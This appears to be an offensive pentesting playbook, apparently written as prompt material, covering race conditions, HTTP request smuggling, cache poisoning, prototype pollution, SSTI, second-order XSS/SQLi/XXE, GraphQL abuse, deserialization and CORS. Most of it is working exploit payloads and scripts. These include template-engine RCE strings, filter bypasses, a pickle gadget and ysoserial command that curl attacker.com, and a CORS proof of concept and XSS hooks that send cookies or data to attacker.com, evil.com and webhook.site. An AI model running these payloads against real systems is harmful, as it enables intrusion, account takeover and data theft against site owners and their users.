<advanced_attacks>
## Advanced Attack Techniques

These techniques separate skilled pentesters from automated scanners. Use them when standard OWASP Top 10 attacks fail.

---

## 1. Race Conditions

### When to Suspect

| Scenario | Why It's Vulnerable |
|----------|-------------------|
| Discount/coupon codes | Check-then-use pattern |
| Balance operations (transfer, withdraw) | Read-modify-write cycle |
| Voting/rating systems | Increment without locking |
| File uploads with processing | TOCTOU vulnerabilities |
| Invitation/referral systems | Single-use token validation |
| Stock/inventory management | Quantity check before decrement |
| Account creation with uniqueness | Email/username uniqueness check |

### Detection Methodology

**Step 1: Identify Critical Operations**
- Operations that should only happen once
- Operations on shared resources (balances, counters)
- Time-sensitive operations (auctions, bidding)
- Status transitions (pending -> approved)

**Step 2: Test with Concurrent Requests**
```bash
# Using GNU parallel - send 50 requests simultaneously
parallel -j50 curl -s -X POST https://target.com/api/redeem \
  -H "Cookie: session=xyz" \
  -d "code=DISCOUNT50" ::: {1..50}

# Using curl with background processes
for i in {1..50}; do
  (curl -X POST "https://target.com/api/vote" -d "id=123" &)
done
wait
```

**Step 3: Check for Double-Processing**
- Was coupon applied multiple times?
- Did balance decrease more than once?
- Were multiple votes counted?

### Exploitation Payloads

**Coupon Double-Apply:**
```python
import asyncio
import aiohttp

async def redeem(session, url, code):
    async with session.post(url, json={"code": code}) as resp:
        return await resp.json()

async def race_test():
    async with aiohttp.ClientSession() as session:
        tasks = [redeem(session, "https://target.com/api/coupon", "SAVE50")
                 for _ in range(100)]
        results = await asyncio.gather(*tasks)
        successes = sum(1 for r in results if r.get("success"))
        print(f"Successful redemptions: {successes}")  # Should be 1, not more

asyncio.run(race_test())
```

**Balance Overdraft:**
```bash
# If balance is $100, try to withdraw $100 x 50 times simultaneously
for i in {1..50}; do
  (curl -X POST "https://target.com/api/withdraw" \
    -H "Cookie: session=xyz" \
    -d "amount=100" &)
done
wait
# Check if more than $100 was withdrawn
```

---

## 2. HTTP Request Smuggling

### Variants

| Type | Front-end Uses | Back-end Uses | Attack Vector |
|------|---------------|---------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding | Front processes CL, back waits for TE |
| TE.CL | Transfer-Encoding | Content-Length | Front processes TE, back processes CL |
| TE.TE | Both (different parsing) | Both | Header obfuscation confuses one |

### Detection Methodology

**Step 1: Identify Multi-Tier Architecture**
- CDN present (Cloudflare, Akamai, Fastly)
- Load balancer (HAProxy, nginx, AWS ALB)
- Different server headers in errors vs normal

**Step 2: CL.TE Detection**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```
- If **timeout**: Vulnerable (back-end waiting for more chunks)
- If **immediate response**: Not vulnerable

**Step 3: TE.CL Detection**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
- If **timeout**: Vulnerable
- If **immediate error**: Not vulnerable

### Exploitation Payloads

**CL.TE - Bypass WAF to Access /admin:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
Content-Length: 10

x=
```

**TE.CL - Poison Next User's Request:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=
0

```

**TE.TE - Header Obfuscation:**
```http
Transfer-Encoding: chunked
Transfer-Encoding: cow
Transfer-Encoding: chunked
Transfer-encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: xchunked
```

---

## 3. Cache Poisoning

### When to Suspect

| Indicator | Why |
|-----------|-----|
| CDN in use | Caching layer present |
| X-Cache, Age headers | Explicit caching |
| Varnish, CloudFlare, Fastly | Known caching services |
| Static resources cached | Inconsistent behavior possible |

### Detection Methodology

**Step 1: Identify Caching**
```bash
curl -I https://target.com/page | grep -i "x-cache\|age\|cf-cache"
```

**Step 2: Find Unkeyed Inputs**
Test headers NOT included in cache key:
```bash
# Add unique cache-buster to isolate tests
curl "https://target.com/page?cb=$RANDOM" \
  -H "X-Forwarded-Host: evil-test.com"

# Immediately request again without the header
curl "https://target.com/page?cb=$RANDOM"

# If evil-test.com appears in second response -> cache poisoned!
```

**Unkeyed headers to test:**
- X-Forwarded-Host
- X-Forwarded-Scheme
- X-Original-URL
- X-Rewrite-URL
- X-Forwarded-Prefix

### Exploitation Payloads

**X-Forwarded-Host Injection:**
```http
GET /page?cachebuster=123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com"><script>alert(1)</script>
```

**Cache Persistence XSS:**
```http
GET /static/app.js HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com"></script><script>alert(document.cookie)</script>
```

---

## 4. Prototype Pollution (JavaScript)

### When to Suspect

| Indicator | Why |
|-----------|-----|
| Node.js/Express backend | Server-side JS |
| Object merge operations | Object.assign, lodash merge |
| User-controlled JSON input | Potential __proto__ injection |
| URL hash fragments as config | DOM-based pollution |

### Detection Methodology

**Server-Side Detection:**
```bash
# Test JSON body pollution
curl -X POST https://target.com/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": true}}'

# Test query parameter pollution
curl "https://target.com/api?__proto__[polluted]=true"

# Check for behavioral change
curl https://target.com/api/settings
# If "polluted" appears in response -> vulnerable
```

**Constructor Pollution (alternative):**
```json
{"constructor": {"prototype": {"polluted": true}}}
```

### Exploitation to RCE

**EJS Template Engine:**
```json
{
  "__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
  }
}
```

**Pug Template Engine:**
```json
{
  "__proto__": {
    "block": {
      "type": "Text",
      "line": "process.mainModule.require('child_process').execSync('id')"
    }
  }
}
```

**Handlebars Template Engine:**
```json
{
  "__proto__": {
    "main": "process.mainModule.require('child_process').execSync('id')"
  }
}
```

---

## 5. Server-Side Template Injection (SSTI) - Extended

### Universal Detection Polyglot

```
${{<%[%'"}}%\
```

### Detection Decision Tree

```
Test: {{7*7}}
├── Returns 49
│   Test: {{7*'7'}}
│   ├── Returns 7777777 → Jinja2 (Python)
│   └── Returns 49 → Twig (PHP)
├── Returns {{7*7}}
│   Test: ${7*7}
│   ├── Returns 49 → Freemarker, Velocity, Mako
│   └── Test: <%= 7*7 %>
│       ├── Returns 49 → ERB (Ruby)
│       └── Test: #{7*7}
│           └── Returns 49 → Thymeleaf
└── Error → Potential injection point
```

### Template-Specific RCE Payloads

**Jinja2 (Python/Flask):**
```python
# Basic RCE
{{lipsum.__globals__.os.popen('id').read()}}

# Alternative
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Via request object (Flask)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Subclass walking
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```

**Twig (PHP/Symfony):**
```php
# Old versions
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# File read
{{'/etc/passwd'|file_excerpt(1,30)}}
```

**Freemarker (Java):**
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Velocity (Java):**
```java
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($p=$rt.getRuntime().exec('id'))
$p.waitFor()$p.exitValue()
```

**ERB (Ruby):**
```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
```

**Thymeleaf (Java/Spring):**
```java
__${T(java.lang.Runtime).getRuntime().exec('id')}__
```

### Bypass Techniques

**Blocked __class__:**
```python
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
{{''|attr('__cla'+'ss__')}}
```

**Blocked specific keywords:**
```python
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
```

---

## 6. Second-Order Vulnerabilities

### Stored XSS Through Admin Panels

**Attack Flow:**
1. Set display name to: `<script src=//evil.com/hook.js></script>`
2. Wait for admin to view user list
3. Payload executes in admin context
4. Steal admin session, perform admin actions

**Test with blind callback:**
```html
<img src=x onerror="fetch('https://webhook.site/xyz?c='+document.cookie)">
```

### SQLi Through Log Files

**Attack Flow:**
1. Inject SQL in logged field (User-Agent, search query)
2. Admin views logs in web interface
3. Log viewer queries: `SELECT * FROM logs WHERE query LIKE '%$search%'`
4. Your payload executes

```
User-Agent: ' UNION SELECT password FROM users--
```

### XXE Through Document Uploads

**SVG File:**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**DOCX File (modify word/document.xml inside ZIP):**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/?data=file:///etc/passwd">
]>
```

---

## 7. Business Logic Flaws

### Price Manipulation

| Attack | Payload | Expected |
|--------|---------|----------|
| Negative price | `{"price": -100}` | Credit to account |
| Negative quantity | `{"qty": -5}` | Refund without return |
| Zero price | `{"price": 0}` | Free items |
| Decimal abuse | `{"price": 0.001}` | Rounding errors |
| Integer overflow | `{"qty": 9999999999}` | Wrap to negative |
| Currency confusion | `{"currency": "JPY"}` | Pay less in weak currency |

### Workflow Bypass

```
Normal:  Step1 -> Step2 -> Step3 -> Complete
Attack:  Jump directly to Step3

Test: Capture Step3 request, replay without Step1/2
```

### Discount Stacking

```bash
# Apply multiple coupons via race condition
for code in SAVE10 SAVE20 FREESHIP; do
  (curl -X POST https://target.com/api/coupon -d "code=$code" &)
done
wait
```

---

## 8. GraphQL Attacks

### Introspection Query

```graphql
query {
  __schema {
    types {
      name
      fields { name type { name } }
    }
  }
}
```

### Batch Attack (Rate Limit Bypass)

```graphql
mutation {
  a1: login(email: "admin@target.com", password: "pass1") { token }
  a2: login(email: "admin@target.com", password: "pass2") { token }
  a3: login(email: "admin@target.com", password: "pass3") { token }
  # ... 1000 attempts in 1 request
}
```

### IDOR via Batching

```graphql
query {
  u1: user(id: "1") { email ssn }
  u2: user(id: "2") { email ssn }
  u3: user(id: "3") { email ssn }
  # Enumerate 1000 users
}
```

### Injection via Arguments

```graphql
query { user(id: "1' OR '1'='1") { email } }
query { search(query: "' UNION SELECT password FROM users--") { results } }
```

---

## 9. Deserialization Attacks

### Detection by Magic Bytes

| Format | Magic Bytes | Base64 Prefix | Technology |
|--------|------------|---------------|------------|
| Java | AC ED 00 05 | rO0AB | Java |
| PHP | O: or a: | (ASCII) | PHP |
| Python Pickle | 80 04 95 | gASV | Python 3 |
| .NET BinaryFormatter | 00 01 00 00 | AAEAAAD | .NET |

### Java (ysoserial)

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections5 "curl http://attacker.com/\$(id|base64)" | base64

# Common gadget chains:
# CommonsCollections1-7
# Spring1/2
# Hibernate1/2
```

### PHP (phpggc)

```bash
phpggc Laravel/RCE1 system 'id' -b
phpggc Symfony/RCE4 exec 'id' -b
```

### Python Pickle

```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/$(id)',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

---

## 10. CORS Misconfigurations

### Detection Matrix

| Test Origin | Vulnerable If |
|-------------|---------------|
| `https://evil.com` | Origin reflected in ACAO |
| `null` | ACAO: null |
| `https://target.com.evil.com` | Origin reflected |
| `https://evilstarget.com` | Origin reflected |

### Testing

```bash
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo "Testing: $origin"
  curl -s -I "https://target.com/api/user" -H "Origin: $origin" | grep -i access-control
done
```

### Exploitation PoC

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://target.com/api/user", true);
xhr.withCredentials = true;
xhr.onload = function() {
  // Send stolen data to attacker
  new Image().src = "https://attacker.com/steal?data=" +
    encodeURIComponent(xhr.responseText);
};
xhr.send();
</script>
```

---

## Chain Discovery Matrix

| Technique | Chains With | Impact |
|-----------|------------|--------|
| Race condition | IDOR | Mass data manipulation |
| HTTP smuggling | Cache | Persistent XSS via cache |
| Prototype pollution | Template engine | Server-side RCE |
| CORS + XSS | Session endpoint | Account takeover |
| SSTI | File upload | Webshell via template |
| Second-order SQLi | Log viewer | Admin database access |
| GraphQL batching | Rate limit | Credential stuffing |
| Cache poisoning | XSS | Persistent attack on all users |

</advanced_attacks>
